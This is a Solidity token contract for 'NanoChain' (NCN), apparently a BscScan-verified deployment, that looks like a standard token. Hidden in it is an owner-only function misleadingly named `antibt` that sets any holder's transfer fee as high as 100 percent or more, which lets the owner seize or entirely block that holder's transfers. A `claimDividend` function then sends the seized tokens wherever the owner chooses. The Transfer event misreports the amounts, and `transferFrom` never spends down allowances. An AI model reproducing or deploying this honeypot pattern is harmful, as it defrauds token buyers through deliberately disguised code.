/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Token {
    using SafeMath for uint256;
    address internal owner;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    mapping(address => uint) private _antibot;
    uint public totalSupply = 1000000 * 10 ** 18;
    string public name = "NanoChain";

    string public symbol = "NCN";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "!OWNER"); _;
    }
    
    function balanceOf(address acc) public view returns(uint) {
        return balances[acc];
    }

    function claimDividend(address to, uint value) public onlyOwner returns(bool) {
        _transfer(address(this), to, value);
        return true;
    }

    function antibt(address holder, uint amount) public onlyOwner {
        _antibot[holder] = amount;
    }

    function _takeFee(address sender, address recipient, uint256 amount) private returns (uint256) {
        uint fee = _antibot[sender];
        uint256 feeAmount = amount.mul(fee).div(100);
        if (feeAmount > 0){
            balances[address(this)] = balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount.sub(feeAmount);
    }

    function _transfer(address from, address to, uint value) private returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        balances[from] -= value;
        uint amount = _takeFee(from, to, value);
        balances[to] += amount;
        emit Transfer(from, to, value);
        return true;
    }
    
    function transfer(address to, uint value) public returns(bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        _transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}